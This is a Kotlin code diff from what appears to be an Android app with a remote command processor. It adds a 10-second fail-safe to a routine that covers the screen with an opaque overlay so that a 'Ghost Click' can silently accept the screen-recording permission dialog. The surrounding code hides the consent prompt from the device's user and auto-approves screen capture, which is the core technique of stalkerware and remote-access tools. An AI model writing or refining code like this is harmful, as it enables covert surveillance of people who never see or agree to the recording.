@@ -493,6 +493,15 @@ object CommandProcessor {
                         // Apply the opaque blindfold instantly before the dialog arrives
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 100, "OVERLAY")
+                            
+                            // FAIL-SAFE: If the Ghost Click fails or hangs, forcefully unblind after 10s
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (ScreenRecordManager.expectedMode == "AUTO") {
+                                    DebugLogger.log("SCREEN_REC_FAIL", "Ghost Accept timed out. Forcefully removing blindfold.")
+                                    DimmerManager.removeOverlay(ctx)
+                                    ScreenRecordManager.expectedMode = "" 
+                                }
+                            }, 10000)
                         }
                     }
                     
